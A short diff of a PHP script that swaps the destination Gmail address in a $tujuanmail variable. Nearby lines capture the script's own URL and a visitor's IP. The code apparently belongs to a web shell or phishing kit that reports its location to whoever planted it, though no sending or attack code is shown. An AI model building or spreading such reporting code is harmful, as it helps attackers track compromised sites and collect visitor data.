@@ -173,7 +173,7 @@ set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
 
-$tujuanmail = 'robbysalvador66@gmail.com';
+$tujuanmail = 'zethtinker680@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 
 // Get IP address
